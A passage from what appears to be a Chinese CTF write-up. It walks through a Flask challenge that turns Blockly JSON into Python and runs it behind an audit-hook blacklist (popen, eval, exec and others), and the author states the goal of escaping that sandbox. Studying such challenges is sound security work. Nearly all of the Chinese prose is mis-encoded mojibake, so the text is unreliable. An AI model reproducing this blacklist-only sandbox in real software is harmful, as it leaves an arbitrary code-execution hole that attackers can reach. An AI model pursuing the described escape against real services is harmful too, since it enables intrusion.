class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    python_code = <span class="string">&quot;&quot;</span></span><br><span class="line">    python_code += block_to_python(block) + <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> python_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do</span>(<span class="params">source_code</span>):</span><br><span class="line">    hook_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def my_audit_hook(event_name, arg):</span></span><br><span class="line"><span class="string">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span></span><br><span class="line"><span class="string">    if len(event_name) &gt; 4:</span></span><br><span class="line"><span class="string">        raise RuntimeError(&quot;Too Long!&quot;)</span></span><br><span class="line"><span class="string">    for bad in blacklist:</span></span><br><span class="line"><span class="string">        if bad in event_name:</span></span><br><span class="line"><span class="string">            raise RuntimeError(&quot;No!&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(source_code)</span><br><span class="line">    code = hook_code + source_code</span><br><span class="line">    tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> verify_secure(tree):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(code)</span><br><span class="line">            result = subprocess.run([<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;run.py&#x27;</span>], stdout=subprocess.PIPE, timeout=<span class="number">5</span>).stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Execution aborted due to security concerns.&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Timeout!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> app.send_static_file(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/blockly_json&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blockly_json</span>():</span><br><span class="line">    blockly_data = request.get_data()</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(blockly_data))</span><br><span class="line">    blockly_data = json.loads(blockly_data.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(blockly_data)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        python_code = json_to_python(blockly_data)</span><br><span class="line">        <span class="keyword">return</span> do(python_code)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Error generating Python code&quot;</span>, <span class="string">&quot;details&quot;</span>: <span class="built_in">str</span>(e)&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>â€‹ä¸€ç‚¹å°ç–‘é—®ï¼Œè¿™ä¸ªä»£ç æœ‰å•¥ç”¨ï¼Œä¸ºå•¥æ²¡æ‰§è¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">module_exists</span>(<span class="params">module_name</span>):</span><br><span class="line">    spec = importlib.util.find_spec(module_name)</span><br><span class="line">    <span class="keyword">if</span> spec <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> module_name <span class="keyword">in</span> sys.builtin_module_names:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> spec.origin:</span><br><span class="line">        std_lib_path = os.path.dirname(os.__file__)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> spec.origin.startswith(std_lib_path) <span class="keyword">and</span> <span class="keyword">not</span> spec.origin.startswith(os.getcwd()):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><blockquote><p>â€‹è¿™æ®µä»£ç å®šä¹‰äº†ä¸€ä¸ªå‡½æ•°  <code>module_exists</code> ï¼Œç”¨äºæ£€æŸ¥ä¸€ä¸ªæŒ‡å®šçš„æ¨¡å—æ˜¯å¦å­˜åœ¨ã€‚è¿™ä¸ªå‡½æ•°é€šè¿‡å‡ ä¸ªæ­¥éª¤æ¥åˆ¤æ–­æ¨¡å—æ˜¯å¦å­˜åœ¨ï¼Œå¹¶ä¸”åŒºåˆ†äº†å†…ç½®æ¨¡å—ã€æ ‡å‡†åº“æ¨¡å—å’Œç¬¬ä¸‰æ–¹æˆ–æœ¬åœ°æ¨¡å—ã€‚ä¸‹é¢æ˜¯å¯¹è¿™æ®µä»£ç çš„é€è¡Œè§£é‡Šï¼š</p><ol><li><pre><code> def module_exists(module_name):</code></pre></li></ol>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - è¿™è¡Œå®šä¹‰äº†ä¸€ä¸ªåä¸º `module_exists` çš„å‡½æ•°ï¼Œå®ƒæ¥å—ä¸€ä¸ªå‚æ•° `module_name`ï¼Œå³è¦æ£€æŸ¥çš„æ¨¡å—åã€‚</span><br><span class="line"></span><br><span class="line">&gt;2. ```</span><br><span class="line">  spec = importlib.util.find_spec(module_name)</span><br></pre></td></tr></table></figure><ul><li>ä½¿ç”¨  <code>importlib.util.find_spec</code>  å‡½æ•°å°è¯•æ‰¾åˆ°åä¸º  <code>module_name</code>  çš„æ¨¡å—çš„è§„æ ¼ï¼ˆspecï¼‰ã€‚è¿™ä¸ªå‡½æ•°è¿”å›ä¸€ä¸ªæ¨¡å—è§„æ ¼å¯¹è±¡ï¼Œå¦‚æœæ¨¡å—ä¸å­˜åœ¨ï¼Œåˆ™è¿”å›  <code>None</code> ã€‚</li></ul><ol start="3"><li><pre><code> if spec is None:</code></pre></li></ol>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - è¿™è¡Œæ£€æŸ¥ `find_spec` è¿”å›çš„ `spec` æ˜¯å¦ä¸º `None`ã€‚å¦‚æœæ˜¯ï¼Œè¯´æ˜æ²¡æœ‰æ‰¾åˆ°æ¨¡å—ï¼Œæ‰§è¡Œä¸‹ä¸€è¡Œä»£ç ã€‚</span><br><span class="line"></span><br><span class="line">&gt;4. ```</span><br><span class="line">  return False</span><br></pre></td></tr></table></figure><ul><li>å¦‚æœæ¨¡å—ä¸å­˜åœ¨ï¼ˆ <code>spec</code>  ä¸º  <code>None</code> ï¼‰ï¼Œå‡½æ•°è¿”å›  <code>False</code> ã€‚</li></ul><ol start="5"><li><pre><code> if module_name in sys.builtin_module_names:</code></pre></li></ol>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - è¿™è¡Œæ£€æŸ¥ `module_name` æ˜¯å¦åœ¨ `sys.builtin_module_names` åˆ—è¡¨ä¸­ã€‚`sys.builtin_module_names` åŒ…å«äº†æ‰€æœ‰å†…ç½®æ¨¡å—çš„åç§°ã€‚å¦‚æœ `module_name` æ˜¯å†…ç½®æ¨¡å—ï¼Œæ‰§è¡Œä¸‹ä¸€è¡Œä»£ç ã€‚</span><br><span class="line"></span><br><span class="line">&gt;6. ```</span><br><span class="line">  return True</span><br></pre></td></tr></table></figure><ul><li>å¦‚æœ  <code>module_name</code>  æ˜¯å†…ç½®æ¨¡å—ï¼Œå‡½æ•°è¿”å›  <code>True</code> ã€‚</li></ul><ol start="7"><li><pre><code> if spec.origin:</code></pre></li></ol>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - è¿™è¡Œæ£€æŸ¥ `spec` å¯¹è±¡çš„ `origin` å±æ€§æ˜¯å¦å­˜åœ¨ã€‚`origin` å±æ€§é€šå¸¸åŒ…å«äº†æ¨¡å—çš„æ¥æºè·¯å¾„ã€‚å¦‚æœ `origin` å­˜åœ¨ï¼Œæ‰§è¡Œä¸‹ä¸€è¡Œä»£ç ã€‚</span><br><span class="line"></span><br><span class="line">&gt;8. ```</span><br><span class="line">  std_lib_path = os.path.dirname(os.__file__)</span><br></pre></td></tr></table></figure><ul><li>è¿™è¡Œè·å– Python æ ‡å‡†åº“çš„è·¯å¾„ã€‚ <code>os.__file__</code>  æ˜¯  <code>os</code>  æ¨¡å—çš„è·¯å¾„ï¼Œ <code>os.path.dirname</code>  è·å–è¿™ä¸ªè·¯å¾„çš„ç›®å½•éƒ¨åˆ†ï¼Œå³æ ‡å‡†åº“çš„æ ¹ç›®å½•ã€‚</li></ul><ol start="9"><li><pre><code> if spec.origin.startswith(std_lib_path) and not spec.origin.startswith(os.getcwd()):</code></pre></li></ol>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - è¿™è¡Œæ£€æŸ¥ `spec.origin` æ˜¯å¦ä»¥æ ‡å‡†åº“è·¯å¾„ `std_lib_path` å¼€å¤´ï¼Œå¹¶ä¸”ä¸ä»¥å½“å‰å·¥ä½œç›®å½• `os.getcwd()` å¼€å¤´ã€‚è¿™æ˜¯ä¸ºäº†ç¡®ä¿æ¨¡å—æ˜¯æ ‡å‡†åº“çš„ä¸€éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯å½“å‰å·¥ä½œç›®å½•ä¸‹çš„æ¨¡å—ã€‚å¦‚æœè¿™ä¸¤ä¸ªæ¡ä»¶éƒ½æ»¡è¶³ï¼Œæ‰§è¡Œä¸‹ä¸€è¡Œä»£ç ã€‚</span><br><span class="line"></span><br><span class="line">&gt;10. ```</span><br><span class="line">   return True</span><br></pre></td></tr></table></figure><ul><li>å¦‚æœæ¨¡å—æ˜¯æ ‡å‡†åº“çš„ä¸€éƒ¨åˆ†ï¼Œå‡½æ•°è¿”å›  <code>True</code> ã€‚</li></ul><ol start="11"><li><pre><code>  return False</code></pre></li></ol>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   - å¦‚æœæ¨¡å—æ—¢ä¸æ˜¯å†…ç½®æ¨¡å—ï¼Œä¹Ÿä¸æ˜¯æ ‡å‡†åº“æ¨¡å—ï¼Œå‡½æ•°è¿”å› `False`ã€‚</span><br><span class="line"></span><br><span class="line">&gt;æ€»ç»“ï¼šè¿™ä¸ªå‡½æ•°é€šè¿‡æ£€æŸ¥æ¨¡å—çš„è§„æ ¼ï¼ˆspecï¼‰ï¼Œåˆ¤æ–­æ¨¡å—æ˜¯å¦å­˜åœ¨ï¼Œå¹¶è¿›ä¸€æ­¥åŒºåˆ†æ¨¡å—æ˜¯å†…ç½®æ¨¡å—ã€æ ‡å‡†åº“æ¨¡å—è¿˜æ˜¯å…¶ä»–ç±»å‹çš„æ¨¡å—ã€‚å¦‚æœæ¨¡å—å­˜åœ¨ä¸”æ˜¯å†…ç½®æ¨¡å—æˆ–æ ‡å‡†åº“æ¨¡å—ï¼Œå‡½æ•°è¿”å› `True`ï¼›å¦åˆ™è¿”å› `False`ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">â€‹é—®é¢˜ä¹Ÿå°±å‡ºç°åœ¨è¿™é‡Œï¼Œå‰åæˆ‘æ²¡å‘ç°æœ‰è°ƒç”¨è¿‡è¿™ä¸ªå‡½æ•°ï¼Œå…ˆæ— æ‰€è°“ï¼Œçœ‹çœ‹å®¡å…¶ä»–çš„ã€‚</span><br><span class="line"></span><br><span class="line">â€‹`blockly_json`å‡½æ•°å¼€å§‹ï¼Œå…ˆè¯»å–å‚æ•°ï¼Œä¹‹åè½¬UTF-8ä¹‹åæ‹¿ç»™json_to_pythonå»è½¬ä¸ºpythonä»£ç ï¼š</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">   python_code = &quot;&quot;</span><br><span class="line">   python_code += block_to_python(block) + &quot;\n&quot;</span><br></pre></td></tr></table></figure></blockquote><p>â€‹ç»§ç»­å®¡ block_to_pythonï¼Œè¿™é‡Œå¾ˆæ˜æ˜¾å¯ä»¥çœ‹å‡ºï¼Œä» type é‡Œå–å€¼ï¼Œå¦‚æœæ˜¯ printï¼Œmaxï¼Œminï¼Œnext å°±é€’å½’ç»§ç»­åé¢çš„ä»£ç æˆ–è€…å‚æ•°ï¼Œç›´åˆ°æ²¡æœ‰ç›¸åº”å‚æ•°ä¸ºæ­¢ï¼Œä¹‹åå°±è¿”å› code äº†ï¼Œå½“é‡åˆ° text çš„è¯ï¼Œå°±å°†æ‰€æœ‰çš„å­—ç¬¦ä¸²è¿›è¡Œæ­£åˆ™æ¯”è¾ƒï¼Œé‡åˆ°ç¬¦å·å°±æ¸…ç©º code å‚æ•°ï¼Œå¦åˆ™ code åŠ ä¸Šå»ç„¶åè¿”å›ã€‚ä¹‹åå°±æ˜¯ do äº†ï¼Œè·å¾—æºç ï¼Œç„¶åæ‰§è¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">do</span>(<span class="params">source_code</span>):</span><br><span class="line">    hook_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def my_audit_hook(event_name, arg):</span></span><br><span class="line"><span class="string">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span></span><br><span class="line"><span class="string">    if len(event_name) &gt; 4:</span></span><br><span class="line"><span class="string">        raise RuntimeError(&quot;Too Long!&quot;)</span></span><br><span class="line"><span class="string">    for bad in blacklist:</span></span><br><span class="line"><span class="string">        if bad in event_name:</span></span><br><span class="line"><span class="string">            raise RuntimeError(&quot;No!&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(source_code)</span><br><span class="line">    code = hook_code + source_code</span><br><span class="line">    tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> verify_secure(tree):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(code)</span><br><span class="line">            result = subprocess.run([<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;run.py&#x27;</span>], stdout=subprocess.PIPE, timeout=<span class="number">5</span>).stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Execution aborted due to security concerns.&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Timeout!&quot;</span></span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªæƒ…å†µæ„Ÿè§‰å¾ˆåƒæ˜¯æ²™ç®±äº†ï¼Œä¸å…è®¸æ‰§è¡ŒæŸäº›ç‰¹å®šçš„å‡½æ•°ï¼Œ</p><p>è¿™æ®µä»£ç å®šä¹‰äº†ä¸€ä¸ªåä¸º  <code>my_audit_hook</code>  çš„å‡½æ•°ï¼Œå¹¶å°†å…¶è®¾ç½®ä¸º Python è§£é‡Šå™¨çš„å®¡è®¡é’©å­ï¼ˆaudit hookï¼‰ã€‚å®¡è®¡é’©å­æ˜¯ä¸€ç§æœºåˆ¶ï¼Œå…è®¸å¼€å‘è€…åœ¨ Python æ‰§è¡Œç‰¹å®šäº‹ä»¶æ—¶æ’å…¥è‡ªå®šä¹‰çš„æ£€æŸ¥æˆ–è¡Œä¸ºã€‚è¿™ä¸ªåŠŸèƒ½åœ¨ Python 3.8 ä¸­è¢«å¼•å…¥ï¼Œä¸»è¦ç”¨äºå®‰å…¨ç›®çš„ï¼Œæ¯”å¦‚ç›‘æ§å’Œé™åˆ¶æŸäº›æ½œåœ¨å±é™©çš„æ“ä½œã€‚</p><blockquote><p>è®©æˆ‘ä»¬é€æ­¥è§£æè¿™æ®µä»£ç ï¼š</p><ol><li><p>å‡½æ•°å®šä¹‰</p><p>ï¼š</p><ul><li><code>def my_audit_hook(event_name, arg):</code> ï¼šå®šä¹‰äº†ä¸€ä¸ªåä¸º  <code>my_audit_hook</code>  çš„å‡½æ•°ï¼Œå®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼š <code>event_name</code>  å’Œ  <code>arg</code> ã€‚ <code>event_name</code>  æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºè§¦å‘å®¡è®¡çš„äº‹ä»¶åç§°ï¼› <code>arg</code>  æ˜¯ä¸è¯¥äº‹ä»¶ç›¸å…³çš„é™„åŠ ä¿¡æ¯ï¼Œå…¶ç±»å‹å’Œç»“æ„å–å†³äºå…·ä½“çš„äº‹ä»¶ã€‚</li></ul></li><li><p>é»‘åå•</p><p>ï¼š</p><ul><li><code>blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</code> ï¼šå®šä¹‰äº†ä¸€ä¸ªåä¸º  <code>blacklist</code>  çš„åˆ—è¡¨ï¼ŒåŒ…å«äº†ä¸€ç³»åˆ—ä¸å¸Œæœ›è¢«æ‰§è¡Œçš„å‡½æ•°æˆ–æ“ä½œçš„åç§°ã€‚è¿™äº›æ“ä½œé€šå¸¸å› ä¸ºå®‰å…¨æ€§åŸå› è€Œè¢«è®¤ä¸ºæ˜¯é«˜é£é™©çš„ã€‚</li></ul></li><li><p>äº‹ä»¶åç§°é•¿åº¦æ£€æŸ¥</p><p>ï¼š</p><ul><li><code>if len(event_name) &gt; 4: raise RuntimeError(&quot;Too Long!&quot;)</code> ï¼šè¿™è¡Œä»£ç æ£€æŸ¥  <code>event_name</code>  çš„é•¿åº¦æ˜¯å¦è¶…è¿‡ 4 ä¸ªå­—ç¬¦ã€‚å¦‚æœæ˜¯ï¼Œåˆ™æŠ›å‡º  <code>RuntimeError</code>  å¼‚å¸¸ï¼Œå¼‚å¸¸ä¿¡æ¯ä¸º â€œToo Long!â€ã€‚è¿™ä¸ªæ£€æŸ¥çœ‹èµ·æ¥æ˜¯éšæ„è®¾ç½®çš„ï¼Œå› ä¸ºäº‹ä»¶åç§°çš„é•¿åº¦é€šå¸¸ä¸å®‰å…¨æ€§æ— ç›´æ¥å…³è”ã€‚</li></ul></li><li><p>é»‘åå•æ£€æŸ¥</p><p>ï¼š</p><ul><li>å¾ªç¯éå†  <code>blacklist</code>  åˆ—è¡¨ï¼Œæ£€æŸ¥  <code>event_name</code>  ä¸­æ˜¯å¦åŒ…å«åˆ—è¡¨ä¸­çš„ä»»ä½•å­—ç¬¦ä¸²ã€‚å¦‚æœåŒ…å«ï¼Œåˆ™æŠ›å‡º  <code>RuntimeError</code>  å¼‚å¸¸ï¼Œå¼‚å¸¸ä¿¡æ¯ä¸º â€œNo!â€ã€‚è¿™ä¸ªæ£€æŸ¥æ—¨åœ¨é˜»æ­¢æ‰§è¡Œé»‘åå•ä¸­åˆ—å‡ºçš„é«˜é£é™©æ“ä½œã€‚</li></ul></li><li><p>è®¾ç½®å®¡è®¡é’©å­</p><p>ï¼š</p><ul><li><code>__import__('sys').addaudithook(my_audit_hook)</code> ï¼šè¿™è¡Œä»£ç é¦–å…ˆåŠ¨æ€å¯¼å…¥  <code>sys</code>  æ¨¡å—ï¼ˆå°½ç®¡é€šå¸¸ç›´æ¥å¯¼å…¥  <code>sys</code>  æ¨¡å—æ›´ä¸ºå¸¸è§ï¼‰ï¼Œç„¶åè°ƒç”¨  <code>sys.addaudithook</code>  æ–¹æ³•ï¼Œå°†  <code>my_audit_hook</code>  å‡½æ•°è®¾ç½®ä¸ºå®¡è®¡é’©å­ã€‚è¿™æ„å‘³ç€æ¯å½“ Python è§£é‡Šå™¨æ‰§è¡Œä¸€ä¸ªå®¡è®¡äº‹ä»¶æ—¶ï¼Œ <code>my_audit_hook</code>  å‡½æ•°éƒ½ä¼šè¢«è°ƒç”¨ã€‚</li></ul></li></ol><p><strong>æ³¨æ„</strong>ï¼š</p><ul><li>å®¡è®¡é’©å­æ˜¯ä¸€ä¸ªå¼ºå¤§çš„ç‰¹æ€§ï¼Œåº”è¯¥è°¨æ…ä½¿ç”¨ã€‚ä¸å½“çš„å®¡è®¡é’©å­è®¾ç½®å¯èƒ½ä¼šé˜»æ­¢åˆæ³•çš„æ“ä½œï¼Œå¯¼è‡´ç¨‹åºæ— æ³•æ­£å¸¸è¿è¡Œã€‚</li><li>åœ¨å®é™…ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œå¯¹å®¡è®¡é’©å­çš„ä½¿ç”¨åº”è¯¥åŸºäºè¯¦ç»†çš„å®‰å…¨åˆ†æå’Œé£é™©è¯„ä¼°ã€‚</li></ul><p>- æ­¤ä»£ç ç¤ºä¾‹ä¸­çš„é•¿åº¦æ£€æŸ¥å’Œé»‘åå•å¯èƒ½éœ€è¦æ ¹æ®å®é™…çš„å®‰å…¨éœ€æ±‚è¿›è¡Œè°ƒæ•´ã€‚</p></blockquote><p>â€‹çœ‹ä¸Šå»åƒæ˜¯ä¸€ä¸ªæ²™ç®±ï¼Œå°†ä»£ç å†™å…¥æ–‡ä»¶ï¼Œç„¶åè¿è¡Œï¼Œæ•è·è¾“å‡ºï¼Œéœ€è¦é€ƒé€¸ï¼š<span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTI2NDc/dGltZV9fMTMxMT1HcUd4dURSaVlpd3hscnpHN0R5R0RjR3Zmb1k1UW1vM3gjdG9jLTM0">https://xz.aliyun.com/t/12647?time__1311=GqGxuDRiYiwxlrzG7DyGDcGvfoY5Qmo3x#toc-34</span> ç»•è¿‡ audit hook</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">do</span>(<span class="params">source_code</span>):  </span><br><span class="line">    <span class="comment"># å®šä¹‰äº†ä¸€ä¸ªåä¸ºdoçš„å‡½æ•°ï¼Œå®ƒæ¥å—ä¸€ä¸ªå‚æ•°source_codeï¼Œè¿™ä¸ªå‚æ•°é¢„æœŸæ˜¯ä¸€ä¸ªåŒ…å«Pythonæºä»£ç çš„å­—ç¬¦ä¸²ã€‚  </span></span><br><span class="line">  </span><br><span class="line">    hook_code = <span class="string">&#x27;&#x27;&#x27;  </span></span><br><span class="line"><span class="string">def my_audit_hook(event_name, arg):  </span></span><br><span class="line"><span class="string">    # å®šä¹‰äº†ä¸€ä¸ªå®¡è®¡é’©å­å‡½æ•°my_audit_hookï¼Œå®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼ševent_nameå’Œargã€‚  </span></span><br><span class="line"><span class="string">    # è¿™ä¸ªå‡½æ•°ä¼šåœ¨Pythonçš„å®¡è®¡äº‹ä»¶å‘ç”Ÿæ—¶è¢«è°ƒç”¨ã€‚  </span></span><br><span class="line"><span class="string">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]  </span></span><br><span class="line"><span class="string">    # å®šä¹‰äº†ä¸€ä¸ªé»‘åå•åˆ—è¡¨ï¼ŒåŒ…å«äº†ä¸€äº›å¯èƒ½è¢«è®¤ä¸ºæ˜¯ä¸å®‰å…¨çš„å‡½æ•°åã€‚  </span></span><br><span class="line"><span class="string">    if len(event_name) &gt; 4:  </span></span><br><span class="line"><span class="string">        # æ£€æŸ¥äº‹ä»¶åç§°çš„é•¿åº¦æ˜¯å¦è¶…è¿‡4ä¸ªå­—ç¬¦ã€‚  </span></span><br><span class="line"><span class="string">        # æ³¨æ„ï¼šè¿™ä¸ªæ£€æŸ¥å¯èƒ½å¹¶ä¸ç›´æ¥ä¸å®‰å…¨ç›¸å…³ï¼Œå®ƒå¯èƒ½æ˜¯ä¸€ä¸ªç¤ºä¾‹æˆ–å ä½ç¬¦ã€‚  </span></span><br><span class="line"><span class="string">        raise RuntimeError(&quot;Too Long!&quot;)  </span></span><br><span class="line"><span class="string">    # å¦‚æœäº‹ä»¶åç§°å¤ªé•¿ï¼Œåˆ™æŠ›å‡ºè¿è¡Œæ—¶é”™è¯¯ã€‚  </span></span><br><span class="line"><span class="string">    for bad in blacklist:  